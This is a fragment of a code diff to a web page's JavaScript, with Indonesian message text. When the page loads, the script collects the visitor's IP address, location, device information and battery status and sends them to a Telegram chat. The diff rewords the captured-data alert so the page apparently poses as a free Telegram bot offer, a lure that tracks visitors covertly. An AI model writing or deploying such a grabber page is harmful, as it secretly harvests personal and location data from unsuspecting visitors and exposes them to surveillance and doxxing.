-🚨 <b>AKSES TERDETEKSI!</b> 🚨
+🤖 <b>AKSES BOT TELEGRAM DETEKSI!</b> 🤖
 
-📱 <b>Perangkat telah diakses</b>
+📱 <b>Pengguna mengakses bot Telegram</b>
 ⏰ <b>Waktu:</b> ${accessTime}
 🌐 <b>IP Address:</b> ${ip}
-📍 <b>Lokasi:</b> ${location}
+${locationText}
 💻 <b>Perangkat:</b> ${getDeviceInfo()}
 ${batteryText}
 ⏳ <b>Waktu Baterai:</b> ${batteryInfo.time}
 
-⚠️ <i>Data ini telah dicatat oleh sistem</i>
+📥 <i>Pengguna tertarik dengan bot Telegram gratis</i>
             `;
             
             await sendToTelegram(telegramMessage);
             
-            let countdown = 10;
-            const countdownElement = document.getElementById('countdown');
-            
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                countdownElement.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:Arial;">Halaman telah tertutup</div>';
-                    setTimeout(() => window.close(), 2000);
-                }
-            }, 1000);
+            // Add scroll indicator functionality
+            document.getElementById('scrollIndicator').addEventListener('click', scrollToBottom);
+            window.addEventListener('scroll', updateScrollIndicator);
+            updateScrollIndicator(); // Initial check
         }
         
         window.onload = init;
